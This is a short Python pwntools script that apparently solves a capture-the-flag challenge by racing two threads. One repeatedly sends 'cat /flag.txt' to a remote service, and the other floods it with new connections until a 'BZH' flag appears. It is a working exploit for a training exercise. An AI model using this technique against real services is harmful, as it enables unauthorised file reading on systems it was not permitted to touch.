from pwn import *
import time 
import threading
import os
import sys

if len(sys.argv) < 3:
    print("Usage solve.py <host> <port>")
    exit(1)
_, host, port = sys.argv

def get_flag():
    io = remote(host,int(port))
    for i in range(1000):
        io.sendline(b"cat /flag.txt")
        #io.sendline(b"ls")
        recv_data = io.recvline()
        print(recv_data)
        if b"BZH" in recv_data:
            print("Done")
            os._exit(1)
        time.sleep(0.1)

thread = threading.Thread(target=get_flag)
thread.start()

info("Start second thread")
for i in range(1000):
    io = remote(host,int(port))
    io.sendline(b"")
    time.sleep(0.1)
    io.close()

thread.join()
